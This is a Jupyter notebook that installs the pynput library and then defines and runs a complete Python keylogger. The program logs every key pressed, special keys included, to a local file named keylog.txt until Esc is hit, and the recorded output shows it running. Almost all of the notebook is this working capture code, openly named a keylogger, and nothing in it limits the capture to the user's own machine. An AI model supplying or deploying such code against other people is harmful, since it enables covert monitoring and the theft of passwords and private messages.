{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "7c437385-f663-4a74-9fc8-661613278e43",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in c:\\users\\kiit\\anaconda3\\lib\\site-packages (1.7.7)\n",
      "Requirement already satisfied: six in c:\\users\\kiit\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9b00b46-a154-4c73-9423-6064cb677f63",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keylogger is running. Press 'esc' to stop.\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "# Define the log file\n",
    "log_file = \"keylog.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        # Write the key to the log file\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        # Handle special keys\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(f\"[{key}]\")\n",
    "\n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        # Stop the listener when 'esc' is pressed\n",
    "        return False\n",
    "\n",
    "# Set up the listener\n",
    "def start_keylogger():\n",
    "    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "        print(\"Keylogger is running. Press 'esc' to stop.\")\n",
    "        listener.join()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    start_keylogger()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a34607b5-5972-4ad3-83c7-5ca2d9adace4",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
